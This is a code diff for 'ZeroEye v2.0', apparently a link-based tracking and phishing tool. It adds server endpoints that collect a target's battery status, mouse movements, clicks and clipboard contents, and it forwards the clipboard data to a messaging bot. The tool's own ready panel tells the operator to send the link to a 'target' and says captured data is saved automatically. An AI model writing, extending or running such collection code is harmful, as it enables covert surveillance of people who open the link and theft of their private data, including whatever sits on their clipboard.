@@ -194,7 +194,49 @@ async def receive_location(data: str = Form(...)):
     except Exception as e:
         return {"status": "error"}
 
-# Add other endpoints as needed...
+@app.post("/upload_battery")
+async def receive_battery(data: str = Form(...)):
+    try:
+        info = json.loads(data)
+        console.print(f"[cyan][+] Battery: {info.get('level', 'Unknown')}%[/cyan]")
+        save_local("battery.txt", json.dumps(info, indent=2))
+        return {"status": "ok"}
+    except:
+        return {"status": "error"}
+
+@app.post("/upload_behavior")
+async def receive_behavior(data: str = Form(...)):
+    try:
+        info = json.loads(data)
+        movements = len(info.get('mouseMovements', []))
+        clicks = len(info.get('clicks', []))
+        console.print(f"[blue][+] Behavior: {movements} moves, {clicks} clicks[/blue]")
+        save_local("behavior.txt", f"Session: {movements} moves, {clicks} clicks")
+        return {"status": "ok"}
+    except:
+        return {"status": "error"}
+
+@app.post("/upload_clipboard")
+async def receive_clipboard(data: str = Form(...)):
+    try:
+        info = json.loads(data)
+        content = info.get('content', '')
+        
+        if content:
+            console.print(Panel(
+                f"[bold red]📋 CLIPBOARD DATA[/bold red]\n\n"
+                f"[cyan]Content:[/cyan] {content[:100]}{'...' if len(content) > 100 else ''}",
+                title="Clipboard Capture",
+                border_style="red"
+            ))
+            
+            if bot:
+                bot.send_message(f"📋 *Clipboard*\n\n`{content[:300]}`")
+        
+        save_local("clipboard.txt", f"Clipboard: {content}")
+        return {"status": "ok"}
+    except:
+        return {"status": "error"}
 
 # --- CLEAN WIZARD INTERFACE ---
 def start_wizard():
@@ -259,7 +301,7 @@ def start_wizard():
 
     # Start server and tunnel
     port = 8080
-    console.print(f"\n[green][*] Starting server...[/green]")
+    console.print(f"\n[green][*] Starting server on port {port}...[/green]")
     
     # Initialize tunnel manager
     tunnel_manager = TunnelManager(port)
@@ -267,25 +309,12 @@ def start_wizard():
     console.print("[cyan][*] Establishing secure tunnel...[/cyan]")
     url = tunnel_manager.start_tunnel()
     
-    if url.startswith("Error:"):
-        console.print(Panel(
-            f"[bold red]❌ CONNECTION ERROR[/bold red]\n\n"
-            f"[yellow]Unable to establish secure connection[/yellow]\n\n"
-            f"[cyan]Possible solutions:[/cyan]\n"
-            f"• Check internet connection\n"
-            f"• Restart the application\n"
-            f"• Try again in 2-3 minutes",
-            title="Connection Issue",
-            border_style="red"
-        ))
-        return
-    
     console.print(Panel(
         f"[bold cyan]🚀 ZEROEYE READY[/bold cyan]\n\n"
         f"[bold green]{url}[/bold green]\n\n"
         f"[yellow]📋 Send this link to your target[/yellow]\n"
-        f"[green]✅ Secure tunnel active[/green]\n"
-        f"[grey50]💡 All data will be captured automatically[/grey50]",
+        f"[green]✅ All systems operational[/green]\n"
+        f"[grey50]💡 Data will be saved to captured/ folder[/grey50]",
         title="ZeroEye v2.0 - Professional",
         border_style="green",
         expand=False
